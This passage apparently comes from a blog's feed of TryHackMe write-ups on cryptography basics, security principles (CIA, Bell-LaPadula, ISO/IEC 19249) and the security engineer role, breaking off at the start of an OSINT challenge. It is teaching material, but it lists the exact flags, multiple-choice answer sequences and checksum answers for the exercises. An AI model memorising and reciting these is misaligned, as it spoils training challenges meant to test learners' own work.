class="language-plaintext highlighter-rouge">sha256hmac</code>…</p> <h3 id="questions-4">Questions</h3> <p><em>Files located in task05</em></p> <p><strong>What is the SHA256 checksum of the file <code class="language-plaintext highlighter-rouge">order.json</code>?</strong></p> <p>Using the following command: <code class="language-plaintext highlighter-rouge">sha256sum order.json</code></p> <p><em>Answer: <code class="language-plaintext highlighter-rouge">2c34b68669427d15f76a1c06ab941e3e6038dacdfb9209455c87519a3ef2c660</code></em></p> <p>** Open the file <code class="language-plaintext highlighter-rouge">order.json</code> and change the amount from <em>1000</em> to <em>9000</em>. What is the new SHA256 checksum?**</p> <p>Changing the amount and using the same command.</p> <p><em>Answer: <code class="language-plaintext highlighter-rouge">11faeec5edc2a2bad82ab116bbe4df0f4bc6edd96adac7150bb4e6364a238466</code></em></p> <p><strong>Using SHA256 and the key <code class="language-plaintext highlighter-rouge">3RfDFz82</code>, what is the HMAC of <code class="language-plaintext highlighter-rouge">order.txt</code>?</strong></p> <p>Using the following command: <code class="language-plaintext highlighter-rouge">hmac256 3RfDFz82 order.txt</code></p> <p><em>Answer: <code class="language-plaintext highlighter-rouge">c7e4de386a09ef970300243a70a444ee2a4ca62413aeaeb7097d43d2c5fac89f</code></em></p> <h2 id="task-6---pki-and-ssltls">Task 6 - PKI and SSL/TLS</h2> <p>Like we have seen before, the Diffie-hellman key exchange allows us to agree on a secret key without sending it on a network. However, this protocol is not immune to Man In The Middle (MITM) Attacks. The reason is that there is no way of ensuring the authenticity of the two sides.</p> <p>Here is a diagram explaining this:</p> <figure> <picture> <img src="/assets/img/images/thm_introduction_to_cryptography/ry1BfTk26.png" class="img-fluid rounded z-depth-1 bg-white" width="100%" height="auto" title="Diffie-Hellman MITM" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> <p>The machanism which allows us to confirm other party identity is Public Key Infrastructure (PKI).</p> <p>PKI is a system which permits the handling of cryptographic keys to securize communications. To do that, entities called Certification Authorities (CA) delivers certificates which link a public key to a specific entity like a webserver. These keys are used to establish secure tunnels with protocols like TLS and the certificates have a period of validity.</p> <p>In order to get signed by a certificate authority, we need to:</p> <ol> <li><strong>Generate Certificate Signing Request (CSR)</strong>: A certificate containing the public key which have to be signed by CA.</li> <li><strong>Send CSR to a Certificate Authority (CA)</strong>: The purpose is for the CA to sign your certificate. The alternative and usually insecure solution would be to self-sign the certificate.</li> </ol> <p>The process of signing requires the usage of the private key; because the content is encrypted with a private key, we can ensure the author is the right one by decrypting only by using the correct public key.</p> <p>A CSR can be generated using <code class="language-plaintext highlighter-rouge">openssl</code>:</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>openssl req <span class="nt">-new</span> <span class="nt">-nodes</span> <span class="nt">-newkey</span> rsa:4096 <span class="nt">-keyout</span> key.pem <span class="nt">-out</span> cert.csr
</code></pre></div></div> <p>We can self sign our certificate using the following command:</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>openssl req <span class="nt">-x509</span> <span class="nt">-newkey</span> <span class="nt">-nodes</span> rsa:4096 <span class="nt">-keyout</span> key.pem <span class="nt">-out</span> cert.pem <span class="nt">-sha256</span> <span class="nt">-days</span> 365
</code></pre></div></div> <p>The certificate can be visualized using the command:</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>openssl x509 <span class="nt">-in</span> cert.pem <span class="nt">-text</span>
</code></pre></div></div> <h3 id="questions-5">Questions</h3> <p><em>Files located in task06</em></p> <p><strong>What is the size of the public key in bits?</strong></p> <p>Using the command <code class="language-plaintext highlighter-rouge">openssl x509 -in cert.pem -text | more</code>:</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Subject Public Key Info:
            Public Key Algorithm: rsaEncryption
                Public-Key: <span class="o">(</span>4096 bit<span class="o">)</span>
</code></pre></div></div> <p><em>Answer: <code class="language-plaintext highlighter-rouge">4096</code></em></p> <p><strong>Till which year is this certificate valid?</strong></p> <p>Using the same command:</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Validity
            Not Before: Aug 11 11:34:19 2022 GMT
            Not After : Feb 25 11:34:19 2039 GMT
</code></pre></div></div> <p><em>Answer: <code class="language-plaintext highlighter-rouge">2039</code></em></p> <h2 id="task-7---authenticating-with-passwords">Task 7 - Authenticating with Passwords</h2> <p>With PKI and SSL/TLS, we can communicate with the server and provide sensitive information securely. But the data stored on the server should be also secured.</p> <ol> <li>The least secure method: <strong>plaintext</strong></li> </ol> <p>No effort is required to know the password.</p> <table> <thead> <tr> <th style="text-align: center">Username</th> <th style="text-align: center">Password</th> </tr> </thead> <tbody> <tr> <td style="text-align: center">alice</td> <td style="text-align: center">123</td> </tr> <tr> <td style="text-align: center">bob</td> <td style="text-align: center">156</td> </tr> <tr> <td style="text-align: center">paul</td> <td style="text-align: center">123</td> </tr> </tbody> </table> <ol> <li>A better improvement but not the best: <strong>hashed passwords</strong></li> </ol> <p>This way, in order to recover the password, an attacker should do a bruteforce/dictionnary attack and potentially get the right hash. The snag is that same passwords have the same hash. This kind of table is called a <strong>rainbow table</strong>.</p> <table> <thead> <tr> <th style="text-align: center">Username</th> <th style="text-align: center">Hash(Password)</th> </tr> </thead> <tbody> <tr> <td style="text-align: center">alice</td> <td style="text-align: center">ba1f2511fc30423bdbb183fe33f3dd0f</td> </tr> <tr> <td style="text-align: center">bob</td> <td style="text-align: center">9f430be862c6c636d251b1dddf8f80e6</td> </tr> <tr> <td style="text-align: center">paul</td> <td style="text-align: center">ba1f2511fc30423bdbb183fe33f3dd0f</td> </tr> </tbody> </table> <ol> <li>The best practice: <strong>salted passwords</strong></li> </ol> <p>A further addition we can make is to add a little random string to the password and hash it. The result is then stored and everytime the <em>Hash(Password + Salt)</em> is calculated. This makes the result always different.</p> <table> <thead> <tr> <th style="text-align: center">Username</th> <th style="text-align: center">Hash(Password + Salt)</th> <th>Salt</th> </tr> </thead> <tbody> <tr> <td style="text-align: center">alice</td> <td style="text-align: center">9e612320ccc0a3485902c0acb1b9845d</td> <td>1111</td> </tr> <tr> <td style="text-align: center">bob</td> <td style="text-align: center">824e30ea2eeb523eeb727110344fa4b3</td> <td>123</td> </tr> <tr> <td style="text-align: center">paul</td> <td style="text-align: center">0a0bcd9c7eeac360f2c31ec7633b99c3</td> <td>1269</td> </tr> </tbody> </table> <p>An improvement to this is to use a key derivation function such as PBKDF2. It takes the password and the salt and submit it through a certain number of iterations.</p> <p>Another approach is to use a slow hashing algorithm; it takes by default, a certain amount of time to calculate the hash of the password + salt.</p> <p><a href="https://cheatsheetseries.owasp.org/cheatsheets/Password_Storage_Cheat_Sheet.html">Password Storage Sheet Cheat</a></p> <h3 id="questions-6">Questions</h3> <p>Using the website <a href="https://md5decrypt.net/">md5encrypt.net</a>:</p> <p><em>Answer: <code class="language-plaintext highlighter-rouge">qwerty123</code></em></p> <h2 id="task-8---cryptography-and-data---example">Task 8 - Cryptography and Data - Example</h2> <ol> <li><strong>Certificate Validation:</strong> Cryptography ensures the validity of certificates. A certificate is considered valid if it’s signed. Signing involves encrypting a hash of the certificate with the private key of a trusted third party, and appending the encrypted hash to the certificate.</li> <li><strong>SSL/TLS Handshake:</strong> Once the certificate is validated, an SSL/TLS handshake begins. This handshake allows the client and server to agree on a secret key and symmetric encryption algorithm for secure communication.</li> <li><strong>Symmetric Encryption:</strong> After the handshake, all session communication is encrypted using symmetric encryption, using the agreed-upon secret key.</li> <li><strong>Login Credentials:</strong> The client sends login credentials securely over the encrypted SSL/TLS session. The server receives the credentials and verifies them.</li> <li><strong>Password Storage:</strong> Following security best practices, the server hashes the password, appending a random salt to make it difficult to recover in case of a database breach.</li> </ol> <h2 id="task-9---conclusion">Task 9 - Conclusion</h2> <p>Cryptography is a vast topic. In this room, we tried to focus on the core concepts that would help you understand the commonly used terms in cryptography. This knowledge is vital to understanding the configuration options of systems that use encryption and hashing.</p>]]></content><author><name>NonoHM</name></author><category term="THM"/><category term="Security Engineer"/><summary type="html"><![CDATA[Task 1 - Introduction]]></summary></entry><entry><title type="html">THM Security Principles</title><link href="https://nonohm.github.io/blog/2024/THM-Security-Principles/" rel="alternate" type="text/html" title="THM Security Principles"/><published>2024-01-31T18:07:37+00:00</published><updated>2024-01-31T18:07:37+00:00</updated><id>https://nonohm.github.io/blog/2024/THM-Security-Principles</id><content type="html" xml:base="https://nonohm.github.io/blog/2024/THM-Security-Principles/"><![CDATA[<h2 id="task-1---introduction">Task 1 - Introduction</h2> <p>Security has become a buzzword and everyone wants to claim their product is. In order to make our ones as secure as possible, we should know the adversaries attacks, tactiques and techniques to implement appropriate security controls.</p> <p>The objective of this room is to:</p> <ul> <li>Explain the security functions: Confidentiality, Integrity and Availability (CIA).</li> <li>Present the opposite of the security triad, CIA: Disclosure, Alteration, and Destruction/Denial (DAD).</li> <li>Introduce the fundamental concepts of security models, such as the Bell-LaPadula model.</li> <li>Explain security principles such as Defence-in-Depth, Zero Trust, and Trust but Verify.</li> <li>Introduce ISO/IEC 19249.</li> <li>Explain the difference between Vulnerability, Threat, and Risk.</li> </ul> <h2 id="task-2---cia">Task 2 - CIA</h2> <p>The “CIA triad” is the acronym for Confidentiality, Integrity and Availability.</p> <ol> <li><strong>Confidentiality</strong>: It ensures only the intended persons have access to the material.</li> <li><strong>Integrity</strong>: It ensures the material has not been modified by anyone.</li> <li><strong>Availability</strong>: It ensures the material is available when needed.</li> </ol> <p>Examples:</p> <ul> <li>Confidentiality: The credit card number can only be used by the trusted shopping site and can’t be viewed by third-party.</li> <li>Integrity: The data sent via the form must not be changed, i.e, a shipping address.</li> <li>Availability: The order and website have to be available anytime when the customer needs to. He may go to another one if the online shop is down.</li> </ul> <h3 id="beyond-cia">Beyond CIA</h3> <p>Another thing that can be useful to consider as well as the CIA Triad, is the Autheticity and Non-Repudiation.</p> <ul> <li><strong>Authenticity</strong>: It ensures the document/material is from the claimed source.</li> <li><strong>Non-Repudiation</strong>: It ensures the original author can’t deny being the original author of the material/data…</li> </ul> <p>Some of these can be achieved using:</p> <table> <thead> <tr> <th style="text-align: center">Service</th> <th style="text-align: center">Symetric Cryptography</th> <th>Asymetric Cryptography</th> </tr> </thead> <tbody> <tr> <td style="text-align: center">Confidentiality</td> <td style="text-align: center">Block or stream encryption using password/PSK (Pre-Shared Key)</td> <td>Public key encryption via key exchange</td> </tr> <tr> <td style="text-align: center">Integrity</td> <td style="text-align: center">Message Authentication Code (MAC/HMAC)</td> <td>Digital signature</td> </tr> <tr> <td style="text-align: center">Authenticity</td> <td style="text-align: center">Challenge - Response</td> <td>Digital signature</td> </tr> <tr> <td style="text-align: center">Non-Repudiation</td> <td style="text-align: center">X</td> <td>Digital signature</td> </tr> </tbody> </table> <h3 id="parkerian-hexad">Parkerian Hexad</h3> <p>In 1998, Donn Parker proposed the Parkerian Hexad, a set of six security elements. They are:</p> <ol> <li>Availability</li> <li>Utility</li> <li>Integrity</li> <li>Authenticity</li> <li>Confidentiality</li> <li>Possession</li> </ol> <p>For the non-covered topics:</p> <ul> <li><strong>Utility</strong>: This focuses on the utility of the information, i.e, an encrypted disk without the decryption key is “useless”.</li> <li><strong>Possession</strong>: This element requires that we protect the information from unauthorized taking, copying, or controlling, i.e, a ransomware which successfully encrypted a disk, lead to the loss of possession of it.</li> </ul> <h3 id="questions">Questions</h3> <p><strong>Click on “View Site” and answer the five questions. What is the flag that you obtained at the end?</strong></p> <p>MCQ Answers: C, A, I, C, I</p> <p><em>Answer: <code class="language-plaintext highlighter-rouge">THM{CIA_TRIAD}</code></em></p> <h2 id="task-3---dad">Task 3 - DAD</h2> <p>The security of a system is attacked through one of several means, disclosure, alteration and/or destruction of data. This forms the DAD triad, the “opposite” of the CIA triad.</p> <ul> <li><strong>Disclosure</strong>: The lack of confidentiality.</li> <li><strong>Alteration</strong>: The lack of integrity.</li> <li><strong>Destruction/Denial</strong>: The opposite of availability.</li> </ul> <p>Therefore, building defenses against DAD returns to building CIA in the system. A good security system is the perfect balance between these.</p> <h3 id="questions-1">Questions</h3> <p><strong>The attacker managed to gain access to customer records and dumped them online. What is this attack?</strong></p> <p><em>Answer: <code class="language-plaintext highlighter-rouge">Disclosure</code></em></p> <p><strong>A group of attackers were able to locate both the main and the backup power supply systems and switch them off. As a result, the whole network was shut down. What is this attack?</strong></p> <p><em>Answer: <code class="language-plaintext highlighter-rouge">Destruction/Denial</code></em></p> <h2 id="task-4---fundamental-concepts-of-security-models">Task 4 - Fundamental Concepts of Security Models</h2> <p>Now we have learnt some security concepts, we might ask how to apply these ? Three foundational security models can help us as:</p> <ul> <li>Bell-LaPadula Model</li> <li>The Biba Integrity Model</li> <li>The Clark-Wilson Model</li> </ul> <h3 id="bell-lapadula-model">Bell-LaPadula Model</h3> <p>The Bell-LaPadula Model aims to achieve <strong>confidentiality</strong> with three rules:</p> <ul> <li><strong>Simple Security Property</strong>: Referred as “No read up”. A lower security level object cannot access to a higher security level one.</li> <li><strong>Star Security Property</strong>: Referred as “No write down”. A higher security level cannot write an object at a lower level.</li> <li><strong>Discretionary-Security Property</strong>: This property uses an access matrix to allow read/write operations.</li> </ul> <p>With these rules, we can send information from lower levels “Write up” and receive information from lower ones “Read down”. The limitaion is that model is not designed for file sharing.</p> <h3 id="biba-model">Biba Model</h3> <p>The Biba Model aims to achieve <strong>integrity</strong> by specifying two rules:</p> <ul> <li><strong>Simple Integrity Property</strong>: “No read down”, a higher level cannot read information from lower levels.</li> <li><strong>Star Integrity Property</strong>: “No write up”, a lowel level cannot write iformation for higher levels.</li> </ul> <p>These rules contrast with the Bell-LaPadula model and this model suffers that it can’t handle internal threats.</p> <h3 id="clark-wilson-model">Clark-Wilson Model</h3> <p>The Clark-Wilson Model aims to achieve <strong>integrity</strong> by using four concepts:</p> <ul> <li><strong>Constrained Data Item (CDI)</strong>: The data type which integrity has to be preseved.</li> <li><strong>Unconstrained Data Item (UDI)</strong>: All data types beyond CDI such as user input.</li> <li><strong>Transformation Procedures (TPs):</strong>: Programmed operations such as read and write, and should maintain CDI’s integrity.</li> <li><strong>Integrity Verification Procedures (IVPs)</strong>: Procedures check to ensure validity of CDIs.</li> </ul> <p>There is more models such as:</p> <ul> <li>Brewer and Nash model</li> <li>Goguen-Meseguer model</li> <li>Sutherland model</li> <li>Graham-Denning model</li> <li>Harrison-Ruzzo-Ullman model</li> </ul> <h3 id="questions-2">Questions</h3> <p><strong>Click on “View Site” and answer the four questions. What is the flag that you obtained at the end?</strong></p> <p><em>A = Bell-LaPadula</em> <em>B = Biba</em></p> <p>MCQ answers: B, A, A, B</p> <p><em>Answer: <code class="language-plaintext highlighter-rouge">THM{SECURITY_MODELS}</code></em></p> <h2 id="task-5---defence-in-depth">Task 5 - Defence-in-Depth</h2> <p>Defence-in-Depth refers to creating a Multi-Layer Security using multiples measures at different levels to protect systems and data. This can include thing like firewalls, encryption, access controls, monitoring systems… Moreover, this is like having multiple locks on different doors in the same house; this approach help to mitigate risks, reduces the likelihood of successful attacks, and enhances overall security resilience.</p> <h2 id="task-6---isoiec-19249">Task 6 - ISO/IEC 19249</h2> <p>This standard, ISO/IEC 19249, has been made by the International Organization for Standardization (ISO) and the International Electrotechnical Commission (IEC). It is named <em>Information technology - Security techniques - Catalogue of architectural and design principles for secure products, systems and applications</em> and his purpose is to have a better idea of what international organizations would teach regarding security principles.</p> <p>It lists five architectural principles:</p> <ol> <li><strong>Domain Separation</strong>: Every set of related components is grouped as a single entity. Components can be applications, data or other ressources. Each entity will have its own domain and be assigned a common set of security attributes. Example: Ring architecture of Operating Systems (Kernel/User mode).</li> <li><strong>Layering</strong>: By splitting a system into different layers, it becomes possible to impose security at different levels. This is used in the OSI model, which splits the networking function into 7 layers.</li> <li><strong>Encapsulation</strong>: Like in OOP, direct manipulation of data should be prevented by providing an abstration like a method to safely manipulate the data. This is made by using an API to interface with an application.</li> <li><strong>Redundancy</strong>: This principle ensures availability and integrity of data by putting backup or RAID configurations into systems.</li> <li><strong>Virtualization/Containerization</strong>: The generic concept is to share a single set of hardware among multiple operating systems. They are mainly used for their sandboxing capabilities to test programs or run isolated applications. Unlike virtualization, containerization provides the same kernel for multiple lightweight sandboxes and is more flexible than virtualization but needs a security emphasis on the shared kernel.</li> </ol> <p>ISO/IEC 19249 teaches five design principles:</p> <ol> <li><strong>Least Privilege</strong>: The principle teaches the fact of supplying the least amount of permissions for someone to carry out their task and nothing more.</li> <li><strong>Attack Surface Minimisation</strong>: This represent the vulnerabilites risks aimed to be minimized; i.e, only run the needed services on Linux.</li> <li><strong>Centralized Parameter Validation</strong>: Checking and validation when receiving input, especially from user is crucial in order to prevent things like SQL Injection or Remote Code Execution. This needs to be centralized within one library or system.</li> <li><strong>Centralized General Security Services</strong>: Centralizing services like authentication service is crucial to prevent creating failure and to facilitate the authorization process.</li> <li><strong>Preparing for Error and Exception Handling</strong>: Whenever we build a system, we should take into account that errors and exceptions do and will occur and it needs to be fail safe, like traffic blocking and not leak confidential/error information.</li> </ol> <h3 id="questions-3">Questions</h3> <p><strong>Which principle are you applying when you turn off an insecure server that is not critical to the business?</strong></p> <p><em>Answer: <code class="language-plaintext highlighter-rouge">2</code></em></p> <p><strong>Your company hired a new sales representative. Which principle are they applying when they tell you to give them access only to the company products and prices?</strong></p> <p><em>Answer: <code class="language-plaintext highlighter-rouge">1</code></em></p> <p><strong>While reading the code of an ATM, you noticed a huge chunk of code to handle unexpected situations such as network disconnection and power failure. Which principle are they applying?</strong></p> <p><em>Answer: <code class="language-plaintext highlighter-rouge">5</code></em></p> <h2 id="task-7---zero-trust-versus-trust-but-verify">Task 7 - Zero Trust versus Trust but Verify</h2> <p>Trust is very complex topic, we can’t really function without trust. If we mistrust a hardware, we stop using it completely and making a loss for a company. Two security principles that are of interest to us regarding trust:</p> <ul> <li>Trust but Verify</li> <li>Zero Trust</li> </ul> <ol> <li><strong>Trust but Verify</strong>: This principle teaches that an entity should alawys been verified even if it is trusted. Verifying usually requires proper logging mechanisms and log checking, this is manly made by automated security mechnisms such as proxy and IDS.</li> <li><strong>Zero Trust</strong>: This one treats trust as a vulnerabity, so it tries to eliminate the risk by always checking before accessing to an entity like with authentication and authorization mechanisms. This leds to a more contained damage if occured. The design of Zero Trust is microsegmentation; a network segment can be as small as a single host, so communication between each segment requires, authentication, ACL checks and maybe more.</li> </ol> <h2 id="task-8---threat-versus-risk">Task 8 - Threat versus Risk</h2> <p>There are three terms that we need to take note of to avoid any confusion.</p> <ul> <li><strong>Vulnerability</strong>: Vulnerable means susceptible to attack or damage. In information security, a vulnerability is a weakness.</li> <li><strong>Threat</strong>: A threat is a potential danger associated with this weakness or vulnerability.</li> <li><strong>Risk</strong>: The risk is concerned with the likelihood of a threat actor exploiting a vulnerability and the consequent impact on the business.</li> </ul> <p>Example - Showroom:</p> <ul> <li>Vulnerability: Weakness of standard glass</li> <li>Threat: The glass can be broken</li> <li>Risk: Stealing and impact on the business</li> </ul> <h2 id="task-9---conclusion">Task 9 - Conclusion</h2> <p>In this room, we covered various principles and concepts related to security like CIA Triad and authenticity/nonrepudiation, its antagonist DAD. Moreover, we have seen three security models like Bell-LaPadula for confidentiality, the ISO/IEC 19249 standard, and security principles such as defence in depth, trust but verify, and zero trust.</p>]]></content><author><name>NonoHM</name></author><category term="THM"/><category term="Security Engineer"/><summary type="html"><![CDATA[Task 1 - Introduction]]></summary></entry><entry><title type="html">THM Security Engineer Intro</title><link href="https://nonohm.github.io/blog/2024/THM-Security-Engineer-Intro/" rel="alternate" type="text/html" title="THM Security Engineer Intro"/><published>2024-01-26T14:00:45+00:00</published><updated>2024-01-26T14:00:45+00:00</updated><id>https://nonohm.github.io/blog/2024/THM-Security-Engineer-Intro</id><content type="html" xml:base="https://nonohm.github.io/blog/2024/THM-Security-Engineer-Intro/"><![CDATA[<h2 id="task-1---introduction">Task 1 - Introduction</h2> <p>Security engineers form the backbone a enterprise’s cyber security.</p> <h3 id="learning-objectives">Learning Objectives</h3> <ul> <li>Why does the need for security engineers arise?</li> <li>What are the qualifications required to become a security engineer?</li> <li>What does a security engineer do in a typical day of work?</li> </ul> <h2 id="task-2---what-is-a-security-engineer">Task 2 - What is a Security Engineer?</h2> <h3 id="why-do-organizations-need-security">Why Do Organizations Need Security?</h3> <p>While technology has made the life of organizations a lot easier, it also created a new type data and money revenue for unethical hackers. We often hear about companies getting hacked or ransomed and other type of attacks. In response to these threats, digital security has been growing and some dedicate whole departments created and are still creating.</p> <h3 id="the-role-of-a-security-engineer">The Role of a Security Engineer</h3> <p>A security engineer is someone who:</p> <ul> <li>Owns the overall security of an organization.</li> <li>Ensures that the organization’s cyber security risk is minimized.</li> <li>Creates systems and strategies against cyber threats and secure network solutions.</li> <li>Periodically conducts tests to ensure the robustness of the infrastructure and correct if needed.</li> <li>Collaborates ans coordinates with other teams to establish security protocols across the organization.</li> </ul> <h3 id="qualifications-required-for-a-security-engineer">Qualifications Required for a Security Engineer</h3> <p>When hiring a security engineer, organizations look for:</p> <ul> <li>0-2 years of experience with IT administration, helpdesk, networks or security operations.</li> <li>Basic understanding of computer networks, operating systems, and programming.</li> <li>Basic understanding of security concepts such as Governance, Risk and Compliance (GRC).</li> </ul> <h3 id="questions">Questions</h3> <p><strong>Who ensures that an organization’s cyber security risk is minimized at all times?</strong></p> <p><em>Answer: <code class="language-plaintext highlighter-rouge">Security Engineer</code></em></p> <h2 id="task-3---core-responsibilities-of-a-security-engineer">Task 3 - Core Responsibilities of a Security Engineer</h2> <h3 id="asset-managementasset-inventory">Asset Management/Asset Inventory</h3> <p>One of the primary steps in ensuring an organization’s security is to manage and maintain an inventory of an enterprise’s digital assets. It has to be regularly maintained, updated and it needs to include IP addresses, physical location, network’s place, applications running, permissions and the asset owner details.</p> <h3 id="security-policies">Security Policies</h3> <p>A security engineer helps the creation of security policies based on:</p> <ul> <li>CIA (Confidentiality, Integrity, Availability) &amp; DAD (Disclosure, Alteration, Destruction/Denial)</li> <li>Defence-in-Depth with multi-layer security</li> <li>ISO/IEC 19249 -&gt; Domain Separation, Layering, Encapsulation, Redundancy, Virtualization, Least privilege, Attack Surface Minimisation, Centralized Parameter Validation, Centralized General Security Services, Centralized General Security Services</li> <li>Zero Trust / Trust but Verify</li> <li>Vulnerability / Threat / Risk -&gt; Considreing these aspects</li> </ul> <blockquote> <p>Ref: <a href="https://tryhackme.com/room/securityprinciples">Security Principles</a></p> </blockquote> <h3 id="secure-by-design">Secure by Design</h3> <p>The engineer understands that the security posture receives the most Return on Investment if he follows a secure-by-design philoshophy. This means the implemntation of a Secure network Architecture and the hardenization of the machines as much as secure software development.</p> <blockquote> <p>Ref: <a href="https://tryhackme.com/room/microsoftwindowshardening">Windows Hardening</a>, <a href="https://tryhackme.com/room/linuxsystemhardening">Linux Hardening</a>, <a href="https://tryhackme.com/room/activedirectoryhardening">Active Directory Hardening</a>, <a href="https://tryhackme.com/room/securesdlc">Secure Software Development Lifecycle</a></p> </blockquote> <h3 id="security-assessment-and-assurance">Security Assessment and Assurance</h3> <p>While securely designing a seure network and infrastructure, the job is far from done after that. Security is hard work and requires continuous effort like regular security assessments, audits, red and purple teaming from internal and external structures, creating Request for Quotations.</p> <h3 id="questions-1">Questions</h3> <p><strong>Where are details about an organization’s digital assets, such as name, IP address, and owner, stored?</strong></p> <p><em>Answer: <code class="language-plaintext highlighter-rouge">Asset inventory</code></em></p> <p><strong>Sometimes security policies can’t be followed because of business needs. What avenue does a security engineer have to fulfil business needs in these cases?</strong></p> <p><em>Answer: <code class="language-plaintext highlighter-rouge">Exceptions</code></em></p> <p><strong>What philosophy, if followed, provides the most Return on Investment (ROI)?</strong></p> <p><em>Answer: <code class="language-plaintext highlighter-rouge">Secure by design</code></em></p> <h2 id="task-4---continuous-improvement">Task 4 - Continuous Improvement</h2> <h3 id="ensuring-awareness">Ensuring Awareness</h3> <p>A security engineer might be tasked to maintain a certain security awareness level in the company. Humans are the weakest link in an organization’s company, therefore, he needs to periodically run awareness sessions targeting social engineering and other types of attacks.</p> <h3 id="managing-risks">Managing Risks</h3> <p>Ignoring risks can lead to disruptions, data leakage, lawsuits, or other forms of risk. Therefore, a security engineer is often tasked with identifying security risks, determining their likelihood and impact, and finding solutions to minimize those risks. Sometimes, a decision has to be made because all risks can’t be eliminated but some can be reduced and a clear justification is required.</p> <h3 id="change-management">Change Management</h3> <p>To ensure a robust security posture, he has to keep track of changes in the organization’s digital assets that can affect the security posture and takes measures to improve it, like a new module or an upgrade in the company’s website.</p> <h3 id="vulnerability-management">Vulnerability Management</h3> <p>When new software versions are released and older versions have vulnerabilities found, his job is to monitor current ones and to plan the needed patch.</p> <h3 id="compliance-and-audits">Compliance and Audits</h3> <p>A part of a security engineer’s duties is to ensure the compliance with regulatory and organizational requirements such as PCI-DSS, HIPAA, SOC2, ISO27001, NIST-800-53, and more,with bot internal or external auditors to detect any compliance issues.</p> <h3 id="questions-2">Questions</h3> <p><strong>What is considered the weakest link in an organization’s security?</strong></p> <p><em>Answer: <code class="language-plaintext highlighter-rouge">Humans</code></em></p> <p><strong>An organization’s security evolves with the organization. What helps a security engineer keep the organization secure through these changes?</strong></p> <p><em>Answer: <code class="language-plaintext highlighter-rouge">Change management</code></em></p> <h2 id="task-5---additional-roles-and-responsibilities">Task 5 - Additional Roles and Responsibilities</h2> <h3 id="managing-security-tooling">Managing Security Tooling</h3> <p>A security engineer might sometimes be required to configure or fine-tune security tools such as SIEMs, Firewalls, WAFs, EDRs, and more. He might also be a decision-maker about the needed tools and assessments.</p> <h3 id="tabletop-exercises">Tabletop Exercises</h3> <p>Certain scenarios are identified, exercised. In them, security team members must explain their respective role, like an employee getting hacked, and the security engineer is sometimes required to conduct these exercises.</p> <h3 id="disaster-recovery-and-crisis-management">Disaster Recovery and Crisis Management</h3> <p>A robust security posture requires organizations to plan for untoward incidents, disasters, or crises. In any such scenario, the top priority of the executive management is to maintain business continuity. A security engineer might be involved in disaster recovery, business continuity, and crisis management planning as part of the different compliance frameworks and the organization’s internal policies.</p> <h3 id="questions-3">Questions</h3> <p><strong>What is a theoretical exercise carried out to gauge the operational readiness of an organization from a security point of view?</strong></p> <p><em>Answer: <code class="language-plaintext highlighter-rouge">Tabletop Exercise</code></em></p> <p><strong>What is the priority of the management in case of a disaster or crisis?</strong></p> <p><em>Answer: <code class="language-plaintext highlighter-rouge">Business Continuity</code></em></p> <h2 id="task-6---walking-in-their-shoes">Task 6 - Walking in Their Shoes</h2> <p>Here, we experience what a security engineer might take while performing their duties.</p> <h3 id="external-audit-non-compliance-report">External Audit non-compliance report</h3> <p><strong>Observation 1</strong></p> <p>Restrict accessibility of the servers to only required usage</p> <p><strong>Observation 2</strong></p> <p>Aggregate cloud logs in a single place. Forward the logs from that place to on-prem network using a restricted tunnel</p> <h3 id="vulnerability-assessment-and-penetration-testing-report">Vulnerability Assessment and Penetration testing report</h3> <p><strong>Observation 1</strong></p> <p>Restrict accessibility of the server only through VPN or internal network</p> <p><strong>Observation 2</strong></p> <p>Restrict accessibility of the server only through VPN or internal network</p> <p><strong>Observation 3</strong></p> <p>Patch the vulnerability</p> <h3 id="question">Question</h3> <p><strong>What is the flag shown on the completion of the static site?</strong></p> <p><em>Answer: <code class="language-plaintext highlighter-rouge">THM{S3CUR1TY_3NG1N33R5_R0CK}</code></em></p> <h2 id="task-7---conclusion">Task 7 - Conclusion</h2> <p>To conclude, a security engineer:</p> <ul> <li>Owns the responsibility of an organization’s cyber security.</li> <li>Ensures that the systems and infrastructure of an organization are built securely.</li> <li>Helps maintain this security posture through continuous improvement and changes in the organization’s digital assets.</li> <li>Takes on additional roles and responsibilities to help other teams achieve the collective goal of a secure organization.</li> </ul>]]></content><author><name>NonoHM</name></author><category term="THM"/><category term="Security Engineer"/><summary type="html"><![CDATA[Task 1 - Introduction]]></summary></entry><entry><title type="html">THM CTF OhSINT</title><link href="https://nonohm.github.io/blog/2023/THM-CTF-OhSINT/" rel="alternate" type="text/html" title="THM CTF OhSINT"/><published>2023-11-27T23:04:19+00:00</published><updated>2023-11-27T23:04:19+00:00</updated><id>https://nonohm.github.io/blog/2023/THM-CTF-OhSINT</id><content type="html" xml:base="https://nonohm.github.io/blog/2023/THM-CTF-OhSINT/"><![CDATA[<h2 id="introduction">Introduction</h2> <p>In this room, we are asked to do some online and offline seach about a provided image of the famous valley background of Windows XP.</p> <h2 id="task-1---ohsint">Task 1 - OhSINT</h2> <p><strong>What is this user’s avatar of?</strong></p> <p>Firstly, we need to check the image’s metadata using exiftool.</p> <pre><code class="language-kali">exiftool WindowsXP.jpg
ExifTool Version Number         : 12.67
File Name                       : WindowsXP.jpg
Directory                       : .
File Size                       : 234 kB
File Modification Date/Time     : 2023:11:27 23:09:36+01:00
File Access Date/Time           : 2023:11:27 23:09:36+01:00
File Inode Change Date/Time     : 2023:11:27 23:09:36+01:00
File Permissions                : -rwxr-xr-x
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
XMP Toolkit                     : Image::ExifTool 11.27
GPS Latitude                    : 54 deg 17' 41.27" N
GPS Longitude                   : 2 deg 15' 1.33" W
Copyright                       : OWoodflint
Image Width                     : 1920
Image Height                    : 1080
Encoding Process                : Baseline DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)
Image Size                      : 1920x1080
Megapixels                      : 2.1
GPS Latitude Ref                : North
GPS Longitude Ref               : West
GPS Position                    : 54 deg 17' 41.27" N, 2 deg 15' 1.33" W
